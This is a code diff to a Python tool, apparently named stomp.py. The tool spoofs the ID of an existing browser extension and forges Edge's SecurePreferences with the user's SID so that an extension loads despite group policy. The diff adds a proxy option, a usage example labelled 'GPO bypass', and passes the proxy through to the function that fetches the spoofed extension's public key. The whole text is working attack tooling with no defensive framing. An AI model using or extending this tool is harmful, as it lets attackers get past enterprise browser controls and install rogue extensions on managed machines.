@@ -18,6 +18,15 @@ python3 stomp.py EXTENSION_DIR/ \
     --sid "S-1-5-21-...-...-...-..." \
     --target-dir "C:\\Users\\USER\\AppData\\Local" \
     --browser edge
+
+# GPO bypass with proxy (if behind corporate proxy)
+python3 stomp.py EXTENSION_DIR/ \
+    --spoof nmhdhpibnnopknkmonacoephklnflpho \
+    --prefs-file SecurePreferences \
+    --sid "S-1-5-21-...-...-...-..." \
+    --target-dir "C:\\Users\\USER\\AppData\\Local" \
+    --proxy http://proxy.corp.com:8080 \
+    --browser edge
  
 Output ZIP layout
 -----------------
@@ -67,6 +76,9 @@ def main() -> None:
                         default="edge",
                         help="Target browser (default: edge)"
     )
+    parser.add_argument("--proxy",
+                        default=None,
+                        help="HTTP/HTTPS proxy URL (e.g. http://proxy.corp.com:8080) for fetching the CRX from the store")
     parser.add_argument("--output", default=None,
                         help="Output directory for the deployment ZIP (default: current directory)")
     parser.add_argument("--debug", action="store_true",
@@ -81,7 +93,7 @@ def main() -> None:
     # Step 1 & 2: optional ID spoofing
     if args.spoof:
         print(f"[1/3] Fetching public key for {args.spoof}")
-        pub_key = get_public_key_for_id(args.spoof, args.browser)
+        pub_key = get_public_key_for_id(args.spoof, args.browser, proxy=args.proxy)
         if not pub_key:
             print("[-] Could not retrieve public key – aborting.")
             sys.exit(1)
